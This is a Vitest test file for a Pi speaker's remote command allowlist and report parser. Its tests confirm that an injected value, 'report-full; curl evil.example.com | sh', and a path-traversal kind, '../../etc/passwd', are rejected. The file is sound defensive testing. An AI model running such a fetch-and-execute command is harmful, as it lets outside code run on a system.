import { describe, it, expect } from "vitest";
import { isPiCommand, PI_COMMANDS } from "../src/piControl";
import { parseReport, MAX_BODY, TRUNCATION_NOTICE, REPORT_KINDS } from "../src/piReports";

/**
 * The remote escape hatch, built 2026-09-21.
 *
 * On 2026-09-20 the speaker stopped accepting pairings. It was online,
 * beaconing and taking commands; the adapter was UP RUNNING with no
 * PSCAN/ISCAN, so no phone could see it. `report-status` checks three units and
 * none of them were the broken ones, no allowlisted command could restart the
 * Bluetooth units, and the Admin screen rendered 40 characters of line one — so
 * even what WAS collected never reached a human. On campus there is no second
 * way in: 7844 is blocked, Tailscale is SNI-blocked, TCP/22 is filtered.
 */
describe("the escape hatch is on the allowlist", () => {
  it("accepts both new commands", () => {
    expect(isPiCommand("report-full")).toBe(true);
    expect(isPiCommand("run-repair")).toBe(true);
  });

  it("still refuses anything not on the list", () => {
    expect(isPiCommand("run-repair --force")).toBe(false);
    expect(isPiCommand("report-full; curl evil.example.com | sh")).toBe(false);
    expect(isPiCommand("run-repair /opt/lockerroom/lockerroom")).toBe(false);
  });

  it("has no command that takes an argument", () => {
    // Unchanged by this feature, and the property the whole design protects.
    // What `run-repair` varies is the commit you pushed, not an argument.
    for (const c of PI_COMMANDS) expect(c).not.toMatch(/\s/);
  });

  it("stores output only for commands that can actually be sent", () => {
    for (const kind of REPORT_KINDS) expect(isPiCommand(kind)).toBe(true);
  });
});

/**
 * parseReport is the server's gate on a body it will store and then render in
 * the Admin screen — the same second-gate stance parseScan takes on a device
 * name chosen by a stranger's phone.
 */
describe("parseReport", () => {
  it("keeps a real report whole", () => {
    const body = "AuxGoat full report\nhci0: UP RUNNING PSCAN ISCAN\n";
    const r = parseReport({ kind: "report-full", at: "2026-09-21T10:00:00Z", body, ok: true });

    expect(r).not.toBeNull();
    expect(r!.body).toBe(body);
    expect(r!.kind).toBe("report-full");
    expect(r!.collected_at).toBe("2026-09-21T10:00:00Z");
    expect(r!.ok).toBe(true);
  });

  it("refuses a kind it was not expecting", () => {
    // Otherwise anything able to reach the beacon could grow this table one
    // new key at a time.
    expect(parseReport({ kind: "../../etc/passwd", body: "x" })).toBeNull();
    expect(parseReport({ kind: "reboot", body: "x" })).toBeNull();
    expect(parseReport({ body: "no kind at all" })).toBeNull();
  });

  it("refuses an empty or missing body", () => {
    // A stored empty report reads on screen as though the command never ran.
    expect(parseReport({ kind: "report-full", body: "" })).toBeNull();
    expect(parseReport({ kind: "report-full" })).toBeNull();
  });

  it("refuses junk that is not an object at all", () => {
    expect(parseReport(null)).toBeNull();
    expect(parseReport("report-full")).toBeNull();
    expect(parseReport(42)).toBeNull();
  });

  it("announces a cut rather than making one silently", () => {
    // The specific failure this table exists to stop repeating. A truncated
    // dump is worse than no dump, because the line you needed goes missing
    // with nothing on screen admitting it was dropped.
    const r = parseReport({ kind: "report-full", body: "x".repeat(MAX_BODY + 5000) });

    expect(r).not.toBeNull();
    expect(r!.body.length).toBeLessThanOrEqual(MAX_BODY);
    expect(r!.body.endsWith(TRUNCATION_NOTICE)).toBe(true);
    expect(r!.body).toContain("REST IS MISSING");
  });

  it("keeps a failed repair's log", () => {
    // A repair that reported a problem is exactly the log worth reading.
    const r = parseReport({ kind: "run-repair", body: "restart failed", ok: false });
    expect(r!.ok).toBe(false);
    expect(r!.body).toBe("restart failed");
  });

  it("treats a missing ok as success but an explicit false as failure", () => {
    expect(parseReport({ kind: "run-repair", body: "x" })!.ok).toBe(true);
    expect(parseReport({ kind: "run-repair", body: "x", ok: false })!.ok).toBe(false);
  });

  it("falls back to our clock when the Pi does not send one", () => {
    // A box with a bad clock is still a box worth seeing.
    const r = parseReport({ kind: "report-full", body: "x" });
    expect(r!.collected_at).toMatch(/^\d{4}-\d{2}-\d{2}T/);

    const bad = parseReport({ kind: "report-full", body: "x", at: 12345 });
    expect(bad!.collected_at).toMatch(/^\d{4}-\d{2}-\d{2}T/);
  });

  it("holds far more than pi_commands.result does", () => {
    // The entire reason this storage exists. If these ever converge, the
    // feature is pointless.
    expect(MAX_BODY).toBeGreaterThan(2000 * 10);
  });
});
